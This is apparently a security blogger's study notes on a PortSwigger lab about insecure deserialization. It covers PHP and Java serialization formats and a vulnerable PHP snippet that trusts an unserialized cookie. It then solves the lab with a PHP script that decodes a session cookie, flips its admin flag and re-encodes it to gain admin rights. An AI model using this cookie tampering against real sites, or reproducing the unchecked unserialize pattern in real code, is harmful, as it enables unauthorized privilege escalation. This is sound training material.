---
title: Insecure deserialization - Practice
date: 2024-01-19
categories: [PortSwigger, Insecure deserialization]
tags: [portswigger, lab, serialization, deserialization, burp, insecure-deserialisation]
img_path: /assets/portswigger/insecure_deserialization/
published: true
image:
    path: ../portswigger_acad_logo.png
---

---

<center> <a href="https://cspanias.github.io/posts/PS-Insecure-deserialization-Theory/">[Insecure deserialization - Theory]</a> </center>

---

## Identification

During auditing, you should look at all data passed into the website and try to identify anything that looks like serialized data. Once you identify serialized data, you can test whether you are able to control it.

> _Serialized data can be identified relatively easy if you know the format that different languages use._

> _Burp Pro's Scanner will automatically flag any HTTP messages that appear o contain serialized objects._

### PHP serialization format

PHP uses a mostly **human-readable string format**, with letters representing the data type and numbers representing the length of each entry. For example, consider a `User` object with the attributes:

```php
$user->name = "carlos";
$user->isLoggedIn = true;
```

When serialized, this object may look like this:

```php
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

This can be interpreted as follows:
- `O:4:"User"` - An object with the 4-character class name "User".
- `2` - the object has 2 attributes.
- `s:4:"name"` - The key of the first attribute is the 4-character string "name".
- `s:6:"carlos"` - The value of the first attribute is the 6-character string "carlos".
- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string "isLoggedIn".
- `b:1` - The value of the second attribute is the boolean value true.

The native methods for PHP serialization are `serialize()` and `unserialize()`. 

> _If you have source code access, you should start looking for `unserialize()` anywhere in the code and investigating further.

## Java serialization format

Java uses **binary serialization format**. This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs. For example, serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in hex and `rO0` in Base64.

Any class that implements the interface `java.io.Serializable` can be serialized and deserialized.

> _If you have source code access, take note of any code that uses the `readObject()` method, which is used to read and deserialize data from an `InputStream`._

## Exploitation

### Manipulating serialized objects

Exploiting some deserialization vulnerabilities can be as easy as changing an attribute in a serialized object. Generally speaking, there are 2 approaches you can take when manipulating serialized objects:
1. You can edit the object directly in its byte stream form.
2. You can write a short script in the corresponding lagnuage to create and serialize the new object.

The latter is often easier when working with binary serialization formats.

#### Modifying object attributes

Consider a website that uses a serialized `User` object to store data about a user's session in a cookie. If an attacker spotted this serialized object in an HTTP request, they might decode it to find the following byte stream:

```php
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

The `isAdmin` attribute is an obvious point of interest. An attack could:
1. Change the boolean value to `1`.
2. Re-encode the object.
3. Overwrite their current cookie with this modified value.

In isolation, this has no effect. However, let's say the website uses this cookie to check whether the current user has access to certain administrative functionality:

```php
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
// allow access to admin interface
}
```

This vulnerable code would instantiate a `User` object based on the cookie data, including the attacker-modifed `isAdmin` attribute. At no point is the authenticity of the serialized object checked.

This simple scenario is not common in the wild. However, editing an attribute value in this way demonstrates the first step towards accessing the massive amount of attack surface exposed by insecure deserialization.

#### Lab: Modifying serialized objects

> **Objective**: _This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`._

1. When we login as `wiener` our cookie looks like this:

    ![](lab1_login_cookie.png)

2. We can write a [short script](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/portswigger/insecure_deserialization/lab1_deserialize_serialize_cookie.php) using a [PHP Online Compiler](https://www.programiz.com/php/online-compiler/) that will:
    1. Decode the cookie.
    2. Modify the desired value.
    3. Encode the cookie.

    ```php
    <?php

    # set the serialized cookie
    $serialized_cookie = "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d";
    print "Serialized cookie: $serialized_cookie\n\n";

    # URL decode cookie
    $url_decoded_cookie = urldecode($serialized_cookie);
    print "URL decoded cookie: $url_decoded_cookie\n\n";

    # Base64 decode cookie
    $base64_decoded_cookie = base64_decode($url_decoded_cookie);
    print "Base64 decoded cookie: $base64_decoded_cookie\n\n";

    # modify attribute
    $modified_cookie = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}';

    # modify attribute and encode cookie
    $modifed_serialized_cookie = urlencode(base64_encode($modified_cookie));
    print "Modified serialized cookie: $modifed_serialized_cookie";

    ?>
    ```

    The output of the above script is the following:

    ```text
    Serialized cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d

    URL decoded cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=

    Base64 decoded cookie: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

    Modified serialized cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D
    ```

3.  Then, we can test the cookie via Burp's repeater, and if it works, then manually change it via the browser's **developer tools**, refresh the page and, hopefully, become admins:

    ![](lab1_admin_panel.png)

    ![](lab1_inspector_cookie.png)

    ![](lab1_solved.png)

4. Alternatively, we can let **Hackvertor** decode it for us, change the desired attribute, and then delete user `carlos`:

    ![](lab1_hackvertor.png)

    ![](lab1_hackvertor1.png)   

    ![](lab1_hackvertor2.png)  

#### Modifying data types




## Futher practice

- [picoCTF: Super Serial](https://cspanias.github.io/posts/PicoCTF-Super-Serial/)
- [HTB: Precious](https://app.hackthebox.com/machines/Precious/)